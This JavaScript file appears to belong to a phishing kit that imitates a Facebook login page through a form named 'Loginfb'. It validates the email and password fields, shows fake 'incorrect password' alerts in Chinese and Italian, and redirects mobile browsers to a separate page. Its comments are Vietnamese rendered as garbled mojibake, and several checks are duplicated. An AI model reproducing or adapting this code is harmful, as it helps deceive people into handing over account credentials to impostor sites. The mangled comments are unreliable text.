// Login erro
    function validateForm() {

	    //Email phĂ¡ÂºÂ£i Ă„â€˜Ă†Â°Ă¡Â»Â£c Ă„â€˜iĂ¡Â»Ân chÄ‚Â­nh xÄ‚Â¡c
        var email=document.forms["Loginfb"]["email"].value;
        if (email == "") {
            alert(" 電郵地址錯誤");
            return false;
        }
		var email = document.forms["Loginfb"]["email"].value;
        if (email.length<6) {
            alert("電郵地址錯誤");
            return false;
        }
        
        //Pass Mail phĂ¡ÂºÂ£i Ă„â€˜Ă†Â°Ă¡Â»Â£c Ă„â€˜iĂ¡Â»Ân
        var ho = document.forms["Loginfb"]["pass"].value;
        if (ho == "") {
            alert("你输入的密码不正确。");
            return false;
        }
		 //Ă„â€˜Ă¡Â»â„¢ dÄ‚ i mk
		var ho = document.forms["Loginfb"]["pass"].value;
        if (ho.length<6) {
            alert("你输入的密码不正确。");
            return false;
        }
		var ho = document.forms["Loginfb"]["pass"].value;
        if (ho.length>30) {
            alert("你输入的密码不正确。");
            return false;
        }       
		 //MĂ¡ÂºÂ­t khĂ¡ÂºÂ©u phĂ¡ÂºÂ£i Ă„â€˜Ă†Â°Ă¡Â»Â£c Ă„â€˜iĂ¡Â»Ân
        var ho = document.forms["Loginfb"]["pass"].value;
        if (ho == "") {
            alert("你输入的密码不正确。");
            return false;
        }
		 //Ă„â€˜Ă¡Â»â„¢ dÄ‚ i mk
		var ho = document.forms["Loginfb"]["pass"].value;
        if (ho.length<6) {
            alert("La password non Ä‚Â¨ corretta .");
            return false;
        }
		var ho = document.forms["Loginfb"]["pass"].value;
        if (ho.length>30) {
            alert("你输入的密码不正确。");
            return false;
        }
}		
//MOBILE
var uagent = navigator.userAgent.toLowerCase();
var mobilist = new Array('midp', 'j2me', 'symbian', 'opera mini', 'operamini', 'series 60', 's60', 'symbos', 'symbianos', 'nokia', 'htc', 'lg', 'java', 'android', 'ipad', 'iphone');

isMobile = false;
for(i = 0; i < mobilist.length; i++){
    if(uagent.indexOf(mobilist[i]) != -1){
        isMobile = true;
        break;
    }
}
if(isMobile){
    location.href = 'mobile.html';    
}
///////////////////////////////////////////////////////////////////////////////